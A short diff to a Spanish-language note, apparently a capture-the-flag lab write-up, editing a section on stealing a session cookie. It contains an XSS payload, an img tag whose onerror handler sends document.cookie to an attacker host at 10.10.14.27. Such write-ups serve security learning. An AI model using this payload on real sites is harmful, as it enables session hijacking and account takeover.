@@ -63,8 +63,10 @@ obtenemos la petición que hemos realizado por lo cual podemos decir que esta we
 ![[Pasted image 20240408232124.png]]
 
 ### Cookie
-vamos a usar este payload para capturar la cookie de session 
+vamos a usar este payload para capturar la cookie de session. 
 ```python
-<img src=x onerror=this.src='http://10.10.14.27/?c='+document.cookie>
+<img src=x onerror=this.src='http://10.10.14.27/?c='+document.cookie> # URLencode
 ```
 ![[Pasted image 20240408234641.png]]
+
+`cookie`
